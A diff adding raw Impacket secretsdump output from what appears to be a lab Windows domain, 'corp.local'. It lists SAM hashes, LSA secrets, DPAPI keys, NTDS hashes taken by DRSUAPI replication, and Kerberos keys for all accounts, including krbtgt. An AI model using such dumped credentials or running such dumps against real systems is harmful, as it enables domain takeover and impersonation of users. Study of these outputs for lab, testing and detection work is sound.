@@ -1,0 +1,73 @@
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Target system bootKey: 0x9c9369ddfbb918ded86c05798f795df6
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:520126a03f5d5a8d836f1c4f34ede7ce:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+[*] Dumping cached domain logon information (domain/username:hash)
+[*] Dumping LSA Secrets
+[*] $MACHINE.ACC 
+CORP\WIN-FIAQQKE3IKT$:aes256-cts-hmac-sha1-96:d1de4fbe07874f65f894cf7a464fc7a1aa64bd83681695c39a1eee13491628e3
+CORP\WIN-FIAQQKE3IKT$:aes128-cts-hmac-sha1-96:2a984e8aeaf038ca4c91353f41115535
+CORP\WIN-FIAQQKE3IKT$:des-cbc-md5:ec51617f7037b545
+CORP\WIN-FIAQQKE3IKT$:plain_password_hex:3f6d401f589438083184749949af37703854fb5199e4fe967ae6c083164287ab66a76f074222e8c361652a5bf31c7ce3f1369170bc6cf2fca49fcdaf64d7749dcb5bb51752d9ee98339ec49a711a577a7027b47fe53315617a5d70799e3c3914ce1ee11d564cee8efd12168937512b8b193906aaa8b2845dbd9f593a1e4335c42665d220830382d1c2a2b12d99a9e3695fc99b9df5e5c64ff1c12ecdf005e37063e7cab1973e2a06162f9738418e4e97a53304c6fdea26b69b6b68609869dcdbe8091b9682a49e1f35a7f29594fc2ce20af674fc8aa4df1e91852b441837a61ff5b0648ad37e71717010fc38b80d1a45
+CORP\WIN-FIAQQKE3IKT$:aad3b435b51404eeaad3b435b51404ee:4f6589b8afc683eaa28a42c6d23dfc70:::
+[*] DPAPI_SYSTEM 
+dpapi_machinekey:0x48cc3fcd3aa03dee9ba99848740b6308fd8b0ab2
+dpapi_userkey:0x7785972973dc45898a19d52e5194876d00556aec
+[*] NL$KM 
+ 0000   66 8B 0C D9 CC FD 90 9D  AC 2C 28 82 0A 7B 1C B8   f........,(..{..
+ 0010   95 DB 9F D3 B7 EF 23 2A  A9 84 39 28 67 6E D6 DF   ......#*..9(gn..
+ 0020   29 8B F9 5B 01 56 98 CB  45 1C AA D6 C9 30 5E 56   )..[.V..E....0^V
+ 0030   69 C7 11 87 0C 0F 25 FC  43 82 2F B0 A9 80 33 A0   i.....%.C./...3.
+NL$KM:668b0cd9ccfd909dac2c28820a7b1cb895db9fd3b7ef232aa9843928676ed6df298bf95b015698cb451caad6c9305e5669c711870c0f25fc43822fb0a98033a0
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:520126a03f5d5a8d836f1c4f34ede7ce:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4d2b88171d53437c365166048fd65a24:::
+corp.local\j.smith:1103:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
+corp.local\m.jones:1104:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
+corp.local\svc_sql:1105:aad3b435b51404eeaad3b435b51404ee:72f0eefcc213ea8f350773b831cf2c9c:::
+corp.local\svc_backup:1106:aad3b435b51404eeaad3b435b51404ee:dda1e66a984215e9f233baf23c316bc6:::
+WIN-FIAQQKE3IKT$:1000:aad3b435b51404eeaad3b435b51404ee:4f6589b8afc683eaa28a42c6d23dfc70:::
+WIN-PU812JTJF7C$:1107:aad3b435b51404eeaad3b435b51404ee:2f45c4b11d5315b96c9c76787aa4a82a:::
+WS01$:1108:aad3b435b51404eeaad3b435b51404ee:4c3d9953be62194470a013ea579926e6:::
+WS02$:1109:aad3b435b51404eeaad3b435b51404ee:fbf1ed0f2ac0db1b069deeaa8f0d7d52:::
+FAKE01$:1110:aad3b435b51404eeaad3b435b51404ee:c16909555f24a7787bf9fb53310fcb84:::
+[*] Kerberos keys grabbed
+Administrator:aes256-cts-hmac-sha1-96:932b06e8451af883481e4b57cb8b8e3d47b06ea567d8964942c04a3e1cfabf57
+Administrator:aes128-cts-hmac-sha1-96:6c30847e53bf08cf88d5287a33e074cc
+Administrator:des-cbc-md5:d573fb3dfd0223f4
+krbtgt:aes256-cts-hmac-sha1-96:095e1d9e31857fa00335f3e83cffa75159a7aaf09d8f0058ddd2cd45cf82aace
+krbtgt:aes128-cts-hmac-sha1-96:3b439c0d94f8712f8a79d9e193ba070c
+krbtgt:des-cbc-md5:c16e89df7a3d23ef
+corp.local\j.smith:aes256-cts-hmac-sha1-96:155c811e14f9260a6cee87ddf6a6c7239a3c70f1b8096982d08ae10adf1c2341
+corp.local\j.smith:aes128-cts-hmac-sha1-96:ca52905d5051e71f0cbbcd03f941accb
+corp.local\j.smith:des-cbc-md5:c1154fe6d5a7022a
+corp.local\m.jones:aes256-cts-hmac-sha1-96:80f81a9ee7f8c16f2b54c8f6667dfa7bc0fb0061ef8953555e4e64d964b6bd08
+corp.local\m.jones:aes128-cts-hmac-sha1-96:0948a80f684187cf8ba6478856ba8029
+corp.local\m.jones:des-cbc-md5:92ec015bf104b376
+corp.local\svc_sql:aes256-cts-hmac-sha1-96:9793e2d00da1d2dee819536defe862722029e2d8cd1e47b10837096ae32397eb
+corp.local\svc_sql:aes128-cts-hmac-sha1-96:a8bdc5db0ff5990a9518e3b557b98869
+corp.local\svc_sql:des-cbc-md5:497fd316cdc19dce
+corp.local\svc_backup:aes256-cts-hmac-sha1-96:3590b5f456c22a304476786bd2b2a281f02730b1ac9d441a64b209927f7217d8
+corp.local\svc_backup:aes128-cts-hmac-sha1-96:ced881a1ce37c5e643786adf014c0a4e
+corp.local\svc_backup:des-cbc-md5:9b67ae54b649a7b9
+WIN-FIAQQKE3IKT$:aes256-cts-hmac-sha1-96:d1de4fbe07874f65f894cf7a464fc7a1aa64bd83681695c39a1eee13491628e3
+WIN-FIAQQKE3IKT$:aes128-cts-hmac-sha1-96:2a984e8aeaf038ca4c91353f41115535
+WIN-FIAQQKE3IKT$:des-cbc-md5:d6436b51755d3e61
+WIN-PU812JTJF7C$:aes256-cts-hmac-sha1-96:057ebd4003a4a5aa68f5752929a661c3778169bb1d0323cef1eec1a414967b1f
+WIN-PU812JTJF7C$:aes128-cts-hmac-sha1-96:1337192f1e722d4be99f66b69a6baa19
+WIN-PU812JTJF7C$:des-cbc-md5:3d0bbc3dcbb9ae31
+WS01$:aes256-cts-hmac-sha1-96:1820632717ad77e72d2453176c77e86bba08c2703533c64b14f80ad0806c4e24
+WS01$:aes128-cts-hmac-sha1-96:cf77c9e1ba83c1b71be1e07605424b94
+WS01$:des-cbc-md5:0b324c0d105ea4a4
+WS02$:aes256-cts-hmac-sha1-96:e1fe3a27bc461d0e2fdc496186ad3ddd71d5f0b7de0e179f6094d03d2518d9d8
+WS02$:aes128-cts-hmac-sha1-96:c6ff23710d62510220c35b22e0a4712b
+WS02$:des-cbc-md5:7fe0ae3d5e5b40e3
+FAKE01$:aes256-cts-hmac-sha1-96:903f713911da2a15666380e1083fd3e65b5a95eca9082ea5e8df6d7a437fff18
+FAKE01$:aes128-cts-hmac-sha1-96:404a81398d651b23ccfb8661705e4a71
+FAKE01$:des-cbc-md5:3d38ceba382c8ad6
+[*] Cleaning up... 
